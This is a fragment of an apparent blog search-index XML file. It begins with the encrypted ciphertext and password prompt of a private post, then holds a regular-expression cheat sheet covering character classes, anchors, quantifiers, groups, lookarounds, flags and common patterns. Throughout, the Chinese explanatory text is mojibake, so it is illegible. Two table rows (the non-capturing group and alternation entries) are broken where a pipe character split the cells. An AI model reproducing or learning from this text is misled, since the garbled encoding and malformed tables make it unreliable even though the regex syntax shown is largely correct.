b2d13ca02d61a49e06b30aea4f2f9c14ccbdfa95c8808db97009351ddaea5ebc8d853298fba11c42df9ad2e4589320d25ffada43157c49fe5aa0a352fc96d1299981559ab881cd98995002f32282f773e5bcc84d157223a21453687338e1bb125e702192bbd7caa46240bebd9ab0c009eac776bb0a3203ac13f5457b581dc938517444f5d6aca83308b785879102d0ee788a40b14af088167ac227e9ac4a1961b2b189b26d3c1ea4f5561a0e18596cbb2c82f138e5c613ef58910229a95625acbf43ead5bc29c419e1fabf1213b4809e27026bcb03a719dfdf7bb387b9263a75fa60c7214cca5bda0ad4d3d3370267f2aa7cd2a8ec1d2fde93a3ecf8ab8c78c6516e612d672e9fead54eef0f295ac162f8247aba4f55b13d107c09026822e0142401c8fea0bbe48ea20cbc26bc06d12593bac8034c2f9c90f2965ab4db0c6151e9c7b5bba58c690ffefec158935a6d49f30798a6496e0f065bbb6875f6d654e75b75063391b44a83f38c8cd1ece25afd2a66d08448980d8994cbabf50c1f086d8fdd54edfcace3fdc6bf900cfe7090c8e57339b6ea499d2565d53ced27e1faa475371c13bd00ea77eba8222e97c3401885e8e9885f90fd2c11340de02925c25f423f65e4d04dbaef86d5581bfa1b795cabfe0e44a5581e5cba89008f4f707834ef558d56b8e7d925c8be558cfa1ab3b650fafddb0e08bf08eadf723d2a06256f2f0ea0a84cdf7c670c5c99c618c804420a477e2d765ddd02c17d206eec48e871258e261cb3cf8b81c941610bb5f6e130b797475aafc944165edf8ab8a8d72eb657cef8bada2f57493945d3e5a4e2f421e87c136d78792f382fe7d6a89c66d4ac8d06b945058451cd128eac35e403afdbad6f8d750f126541776f18ce23ee74ac0078e6f4d3a9cd423e6fa07c3a477abf112e9ef2ea4336ddad237502cab34b394412d55c7057b91db48158e9dc5c2d40236e04e267fcf94524165017ca6f6c5746eb2e58a36bec9a4cd88b3ed1eb6db6d737d00e4190462c0719eba435bcca2c8c9df793cbd5a4f9dc023a966463208a379e604966794aa082f827725432704e52b82573ebb38efed22ea11aa112111ce786a1c463809d5e9ef3ab732d8dfdcc60afd43c3c1d790e1dce03c98a6c347d506d25ececaa42c8c0cd03263aa7c7c4289749a593e89d6f460ed99e9591db91109506f322996bb6b42b91161dfc054b14ac594fe96db0</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <tags>
        <tag>private</tag>
      </tags>
  </entry>
  <entry>
    <title>ã€é€šç”¨çŸ¥è¯†ã€‘æ­£åˆ™è¡¨è¾¾å¼</title>
    <url>/posts/7a19b1ff/</url>
    <content><![CDATA[<hr>
<h2 id="åŸºç¡€å­—ç¬¦åŒ¹é…"><strong>åŸºç¡€å­—ç¬¦åŒ¹é…</strong></h2>
<table>
<thead>
<tr>
<th>è¯­æ³•</th>
<th>è¯´æ˜</th>
<th>ç¤ºä¾‹</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>abc</code></td>
<td>åŒ¹é…è¿ç»­å­—ç¬¦ â€œabcâ€</td>
<td><code>abc</code> â†’ â€œabcâ€</td>
</tr>
<tr>
<td><code>[abc]</code></td>
<td>åŒ¹é… aã€b æˆ– c ä¸­çš„ä»»æ„å­—ç¬¦</td>
<td><code>[ae]</code> â†’ â€œaâ€ï¼ˆåœ¨ â€œappleâ€ ä¸­ï¼‰</td>
</tr>
<tr>
<td><code>[^abc]</code></td>
<td>åŒ¹é…<strong>é</strong> aã€bã€c çš„å­—ç¬¦</td>
<td><code>[^ap]</code> â†’ â€œlâ€ï¼ˆåœ¨ â€œappleâ€ ä¸­ï¼‰</td>
</tr>
<tr>
<td><code>[a-z]</code></td>
<td>åŒ¹é…ä»»æ„å°å†™å­—æ¯</td>
<td><code>[a-c]</code> â†’ â€œaâ€ã€â€œbâ€ã€â€œcâ€</td>
</tr>
<tr>
<td><code>.</code></td>
<td>åŒ¹é…<strong>ä»»æ„å•ä¸ªå­—ç¬¦</strong>ï¼ˆæ¢è¡Œç¬¦é™¤å¤–ï¼‰</td>
<td><code>a.c</code> â†’ â€œabcâ€ã€â€œaacâ€</td>
</tr>
</tbody>
</table>
<hr>
<h2 id="é¢„å®šä¹‰å­—ç¬¦ç±»"><strong>é¢„å®šä¹‰å­—ç¬¦ç±»</strong></h2>
<table>
<thead>
<tr>
<th>è¯­æ³•</th>
<th>è¯´æ˜</th>
<th>ç­‰ä»·å†™æ³•</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>\d</code></td>
<td>æ•°å­—ï¼ˆ0-9ï¼‰</td>
<td><code>[0-9]</code></td>
</tr>
<tr>
<td><code>\D</code></td>
<td><strong>é</strong>æ•°å­—</td>
<td><code>[^0-9]</code></td>
</tr>
<tr>
<td><code>\w</code></td>
<td>å•è¯å­—ç¬¦ï¼ˆå­—æ¯ã€æ•°å­—ã€ä¸‹åˆ’çº¿ï¼‰</td>
<td><code>[a-zA-Z0-9_]</code></td>
</tr>
<tr>
<td><code>\W</code></td>
<td><strong>é</strong>å•è¯å­—ç¬¦</td>
<td><code>[^\w]</code></td>
</tr>
<tr>
<td><code>\s</code></td>
<td>ç©ºç™½å­—ç¬¦ï¼ˆç©ºæ ¼ã€åˆ¶è¡¨ç¬¦ã€æ¢è¡Œç¬¦ï¼‰</td>
<td><code>[ \t\n\r]</code></td>
</tr>
<tr>
<td><code>\S</code></td>
<td><strong>é</strong>ç©ºç™½å­—ç¬¦</td>
<td><code>[^\s]</code></td>
</tr>
</tbody>
</table>
<hr>
<h2 id="è¾¹ç•ŒåŒ¹é…"><strong>è¾¹ç•ŒåŒ¹é…</strong></h2>
<table>
<thead>
<tr>
<th>è¯­æ³•</th>
<th>è¯´æ˜</th>
<th>ç¤ºä¾‹</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>^</code></td>
<td>å­—ç¬¦ä¸²<strong>å¼€å§‹</strong></td>
<td><code>^abc</code> â†’ â€œabcâ€ï¼ˆéœ€åœ¨å¼€å¤´ï¼‰</td>
</tr>
<tr>
<td><code>$</code></td>
<td>å­—ç¬¦ä¸²<strong>ç»“æŸ</strong></td>
<td><code>end$</code> â†’ â€œendâ€ï¼ˆéœ€åœ¨ç»“å°¾ï¼‰</td>
</tr>
<tr>
<td><code>\b</code></td>
<td>å•è¯è¾¹ç•Œ</td>
<td><code>\bcat\b</code> â†’ â€œcatâ€ï¼ˆä¸åŒ¹é… â€œcatalogâ€ï¼‰</td>
</tr>
<tr>
<td><code>\B</code></td>
<td><strong>é</strong>å•è¯è¾¹ç•Œ</td>
<td><code>\Bcat\B</code> â†’ â€œcatâ€ï¼ˆåœ¨ â€œscatterâ€ ä¸­ï¼‰</td>
</tr>
</tbody>
</table>
<hr>
<h2 id="é‡å¤åŒ¹é…"><strong>é‡å¤åŒ¹é…</strong></h2>
<table>
<thead>
<tr>
<th>è¯­æ³•</th>
<th>è¯´æ˜</th>
<th>ç¤ºä¾‹</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>*</code></td>
<td>åŒ¹é… <strong>0 æ¬¡æˆ–å¤šæ¬¡</strong></td>
<td><code>a*</code> â†’ â€œâ€ã€â€œaâ€ã€â€œaaâ€</td>
</tr>
<tr>
<td><code>+</code></td>
<td>åŒ¹é… <strong>1 æ¬¡æˆ–å¤šæ¬¡</strong></td>
<td><code>a+</code> â†’ â€œaâ€ã€â€œaaâ€ï¼ˆä¸åŒ¹é…ç©ºï¼‰</td>
</tr>
<tr>
<td><code>?</code></td>
<td>åŒ¹é… <strong>0 æ¬¡æˆ– 1 æ¬¡</strong></td>
<td><code>a?</code> â†’ â€œâ€ã€â€œaâ€</td>
</tr>
<tr>
<td><code>&#123;n&#125;</code></td>
<td>åŒ¹é… <strong>n æ¬¡</strong></td>
<td><code>a&#123;3&#125;</code> â†’ â€œaaaâ€</td>
</tr>
<tr>
<td><code>&#123;n,&#125;</code></td>
<td>åŒ¹é… <strong>è‡³å°‘ n æ¬¡</strong></td>
<td><code>a&#123;2,&#125;</code> â†’ â€œaaâ€ã€â€œaaaâ€</td>
</tr>
<tr>
<td><code>&#123;n,m&#125;</code></td>
<td>åŒ¹é… <strong>n åˆ° m æ¬¡</strong></td>
<td><code>a&#123;2,4&#125;</code> â†’ â€œaaâ€ã€â€œaaaâ€</td>
</tr>
</tbody>
</table>
<blockquote>
<p><strong>è´ªå©ªæ¨¡å¼</strong>ï¼ˆé»˜è®¤ï¼‰ï¼šå°½å¯èƒ½å¤šåŒ¹é…ï¼ˆ<code>a.*b</code> åœ¨ â€œaxbxbâ€ ä¸­åŒ¹é…æ•´ä¸ªå­—ç¬¦ä¸²ï¼‰ã€‚<br>
<strong>éè´ªå©ªæ¨¡å¼</strong>ï¼šåŠ  <code>?</code> å°½å¯èƒ½å°‘åŒ¹é…ï¼ˆ<code>a.*?b</code> â†’ â€œaxbâ€ï¼‰ã€‚</p>
</blockquote>
<hr>
<h2 id="åˆ†ç»„ä¸æ•è·"><strong>åˆ†ç»„ä¸æ•è·</strong></h2>
<table>
<thead>
<tr>
<th>è¯­æ³•</th>
<th>è¯´æ˜</th>
<th>ç¤ºä¾‹</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>(exp)</code></td>
<td>æ•è·åˆ†ç»„ï¼Œåç»­å¯å¼•ç”¨</td>
<td><code>(abc)+</code> â†’ â€œabcabcâ€</td>
</tr>
<tr>
<td><code>(?:exp)</code></td>
<td><strong>éæ•è·åˆ†ç»„</strong>ï¼ˆä¸å­˜å‚¨ï¼‰</td>
<td>`(?:abc)</td>
</tr>
<tr>
<td><code>\n</code></td>
<td>å¼•ç”¨ç¬¬ n ä¸ªåˆ†ç»„</td>
<td><code>(a)\1</code> â†’ â€œaaâ€ï¼ˆåŒ¹é…è¿ç»­ä¸¤ä¸ªç›¸åŒå­—ç¬¦ï¼‰</td>
</tr>
<tr>
<td><code>(?&lt;name&gt;exp)</code></td>
<td>å‘½ååˆ†ç»„ï¼ˆé€šè¿‡åç§°å¼•ç”¨ï¼‰</td>
<td><code>(?&lt;num&gt;\d+)</code> â†’ æ•è·æ•°å­—å¹¶å‘½åä¸º â€œnumâ€</td>
</tr>
</tbody>
</table>
<p><font class="notice">æ³¨ï¼šåœ¨çœŸå®å¤§æ•°æ®åœºæ™¯ä¸­ï¼Œéæ•è·åˆ†ç»„é€šå¸¸æ›´å¿«æ›´å¯é ã€‚</font></p>
<hr>
<h2 id="é€‰æ‹©ä¸æ–­è¨€"><strong>é€‰æ‹©ä¸æ–­è¨€</strong></h2>
<table>
<thead>
<tr>
<th>è¯­æ³•</th>
<th>è¯´æ˜</th>
<th>ç¤ºä¾‹</th>
</tr>
</thead>
<tbody>
<tr>
<td>`</td>
<td>`</td>
<td><strong>æˆ–</strong>é€»è¾‘</td>
</tr>
<tr>
<td><code>(?=exp)</code></td>
<td><strong>æ­£å‘å…ˆè¡Œæ–­è¨€</strong>ï¼ˆåé¢æ˜¯ expï¼‰</td>
<td><code>a(?=b)</code> â†’ â€œaâ€ï¼ˆä»…å½“åè·Ÿ â€œbâ€ æ—¶ï¼‰</td>
</tr>
<tr>
<td><code>(?!exp)</code></td>
<td><strong>è´Ÿå‘å…ˆè¡Œæ–­è¨€</strong>ï¼ˆåé¢ä¸æ˜¯ expï¼‰</td>
<td><code>a(?!b)</code> â†’ â€œaâ€ï¼ˆå½“åè·Ÿé â€œbâ€ æ—¶ï¼‰</td>
</tr>
<tr>
<td><code>(?&lt;=exp)</code></td>
<td><strong>æ­£å‘åè¡Œæ–­è¨€</strong>ï¼ˆå‰é¢æ˜¯ expï¼‰</td>
<td><code>(?&lt;=a)b</code> â†’ â€œbâ€ï¼ˆä»…å½“å‰æœ‰ â€œaâ€ æ—¶ï¼‰</td>
</tr>
<tr>
<td><code>(?&lt;!exp)</code></td>
<td><strong>è´Ÿå‘åè¡Œæ–­è¨€</strong>ï¼ˆå‰é¢ä¸æ˜¯ expï¼‰</td>
<td><code>(?&lt;!a)b</code> â†’ â€œbâ€ï¼ˆå½“å‰ä¸æ˜¯ â€œaâ€ æ—¶ï¼‰</td>
</tr>
</tbody>
</table>
<hr>
<h2 id="è½¬ä¹‰ä¸ç‰¹æ®Šå­—ç¬¦"><strong>è½¬ä¹‰ä¸ç‰¹æ®Šå­—ç¬¦</strong></h2>
<ul class="lvl-0">
<li class="lvl-2">
<p>å…ƒå­—ç¬¦éœ€è½¬ä¹‰ï¼š<code>\.</code>ã€<code>\*</code>ã€<code>\(</code>ã€<code>\)</code>ã€<code>\[</code>ã€<code>\\</code> ç­‰ã€‚</p>
</li>
<li class="lvl-2">
<p>ç‰¹æ®Šåºåˆ—ï¼š</p>
<ul class="lvl-2">
<li class="lvl-4"><code>\t</code>ï¼šåˆ¶è¡¨ç¬¦</li>
<li class="lvl-4"><code>\n</code>ï¼šæ¢è¡Œç¬¦</li>
<li class="lvl-4"><code>\r</code>ï¼šå›è½¦ç¬¦</li>
<li class="lvl-4"><code>\x21</code>ï¼šåå…­è¿›åˆ¶å­—ç¬¦ï¼ˆå¦‚ <code>!</code>ï¼‰</li>
<li class="lvl-4"><code>\u4E00</code>ï¼šUnicode å­—ç¬¦ï¼ˆå¦‚ â€œä¸€â€ï¼‰</li>
</ul>
</li>
</ul>
<hr>
<h2 id="æ ‡å¿—ï¼ˆFlagsï¼‰"><strong>æ ‡å¿—ï¼ˆFlagsï¼‰</strong></h2>
<table>
<thead>
<tr>
<th>æ ‡å¿—</th>
<th>è¯´æ˜</th>
<th>ç¤ºä¾‹ï¼ˆå…¨å±€æœç´¢ï¼‰</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>i</code></td>
<td>å¿½ç•¥å¤§å°å†™</td>
<td><code>/aBc/i</code> â†’ â€œabcâ€ã€â€œABCâ€</td>
</tr>
<tr>
<td><code>g</code></td>
<td>å…¨å±€åŒ¹é…ï¼ˆæ‰€æœ‰ç»“æœï¼‰</td>
<td><code>a</code> åœ¨ â€œaaaâ€ ä¸­åŒ¹é… 3 æ¬¡</td>
</tr>
<tr>
<td><code>m</code></td>
<td>å¤šè¡Œæ¨¡å¼ï¼ˆ<code>^</code>/<code>$</code> åŒ¹é…æ¯è¡Œï¼‰</td>
<td><code>^a</code> åŒ¹é…æ¯è¡Œå¼€å¤´çš„ â€œaâ€</td>
</tr>
<tr>
<td><code>s</code></td>
<td>å•è¡Œæ¨¡å¼ï¼ˆ<code>.</code> åŒ¹é…æ¢è¡Œç¬¦ï¼‰</td>
<td><code>a.c</code> â†’ â€œa\ncâ€ï¼ˆå½“ <code>s</code> å¯ç”¨ï¼‰</td>
</tr>
</tbody>
</table>
<hr>
<h2 id="å¸¸ç”¨æ­£åˆ™ç¤ºä¾‹"><strong>å¸¸ç”¨æ­£åˆ™ç¤ºä¾‹</strong></h2>
<p><strong>é‚®ç®±éªŒè¯</strong>ï¼š</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">^[a-zA-<span class="variable constant_">Z0</span>-<span class="number">9.</span>_%+-]+@[a-zA-<span class="variable constant_">Z0</span>-<span class="number">9.</span>-]+\.[a-zA-Z]&#123;<span class="number">2</span>,&#125;$</span><br></pre></td></tr></table></figure>
<p><strong>URL æå–</strong>ï¼š</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">https?:<span class="comment">//[^\s/$.?#]+\.[^\s]+</span></span><br></pre></td></tr></table></figure>
<p><strong>æ—¥æœŸåŒ¹é…ï¼ˆYYYY-MM-DDï¼‰</strong>ï¼š</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">\d&#123;<span class="number">4</span>&#125;-\d&#123;<span class="number">2</span>&#125;-\d&#123;<span class="number">2</span>&#125;</span><br></pre></td></tr></table></figure>
<p><strong>ä¸­æ–‡æ±‰å­—</strong>ï¼š</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">[\u4e00-\u9fa5]</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="å·¥å…·ä¸å­¦ä¹ èµ„æº"><strong>å·¥å…·ä¸å­¦ä¹ èµ„æº</strong></h2>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>åœ¨çº¿æµ‹è¯•å·¥å…·</strong>ï¼š</p>
<ul class="lvl-2">
<li class="lvl-4"><a href="https://regex101.com/">Regex101</a></li>
<li class="lvl-4"><a href="https://regexr.com/">RegExr</a></li>
</ul>
</li>
<li class="lvl-2">
<p><strong>å­¦ä¹ èµ„æ–™</strong>ï¼š</p>
<ul class="lvl-2">
<li class="lvl-4">ã€Šç²¾é€šæ­£åˆ™è¡¨è¾¾å¼ã€‹ï¼ˆJeffrey Friedlï¼‰</li>
<li class="lvl-4"><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Guide/Regular_Expressions">MDN æ­£åˆ™æ–‡æ¡£</a></li>
</ul>
</li>
</ul>
<p>æŒæ¡æ­£åˆ™è¡¨è¾¾å¼å¯å¤§å¹…æå‡æ–‡æœ¬å¤„ç†æ•ˆç‡ï¼å»ºè®®ä»å®é™…æ¡ˆä¾‹å…¥æ‰‹ç»ƒä¹ ï¼Œé€æ­¥ç†Ÿæ‚‰å¤æ‚è¯­æ³•ã€‚</p>
<p>æœ¬æ–‡å‚è€ƒï¼š</p>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
  </entry>
</search>
